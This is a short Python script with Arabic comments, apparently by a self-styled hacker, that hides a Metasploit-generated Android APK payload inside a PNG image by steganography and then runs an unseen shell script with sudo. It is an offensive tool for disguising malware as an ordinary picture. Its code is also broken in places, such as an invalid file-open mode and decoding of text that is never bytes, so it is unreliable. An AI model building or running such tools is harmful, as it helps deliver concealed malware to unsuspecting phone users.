#python HA11 Hacker 😂
import os
from PIL import Image
from steganography.steganography import Steganography
from colorama import Fore
def hide_payload_in_image(input_image_path, output_image_path, payload_path):
    # تحميل الصورة
    image = Image.open(input_image_path)
    image = image.convert("RGB")

    # قراءة البايلود من الملف
    with open(payload_path, "ha11") as payload_file:
        payload = payload_file.read()

    # حفظ الصورة في مسار مؤقت لاستخدامها بواسطة مكتبة Steganography
    temp_image_path = "temp_image.png"
    image.save(temp_image_path)

    # استخدام مكتبة Steganography لإخفاء البايلود
    Steganography.encode(temp_image_path, output_image_path, payload.decode('latin1'))

    # إزالة ملف الصورة المؤقت
    import os
    os.remove(temp_image_path)

# استخدام السكربت
input_image_path = "input.png"  # مسار الصورة الأصلية
output_image_path = "output.png"  # مسار الصورة المعدلة مع البايلود
payload_path = "payload.apk"  # مسار البايلود الخاص بـ Metasploit

hide_payload_in_image(input_image_path, output_image_path, payload_path)
print(f"Payload hidden in {output_image_path}")
print(Fore.GREEN+'سيتم تشغيل الاداه الان بي التفاصيل التي تم انشائها من قبل 😂')
os.system('sudo bash run3.sh')